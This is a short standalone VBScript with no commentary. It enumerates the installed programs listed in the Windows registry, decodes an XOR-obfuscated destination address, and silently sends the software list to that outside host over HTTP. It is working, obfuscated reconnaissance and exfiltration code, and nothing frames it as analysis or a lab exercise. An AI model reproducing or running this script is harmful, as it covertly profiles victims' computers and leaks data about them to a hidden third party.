k="%0A":c="Software\Microsoft\Windows\CurrentVersion\Uninstall":i=&H80000002:j=1::Set d=GetObject("winmgmts:\\.\root\default:StdRegProv"):d.EnumKey i,c,h
For Each g In h
d.GetStringValue i,c&"\"&g,"DisplayName",f
If Not IsNull(f)Then a=a&j&". "& f&k:j=j+1
Next
For i = 1 To 112:r=r&Chr(Asc(Mid("jwpuu='&k{e#zj|tuaux8xj~5ysi(+hkmcDiWjtcdCnrl[dXW}+(v!?0,c>+!47 '412g:2:(7;]LVRTW_Q[XXXJL",i,1))xor i+1):Next
Set request = CreateObject("MSXML2.XMLHTTP")
request.Open "GET", r&j&" apps found"&k&k&a, False
request.Send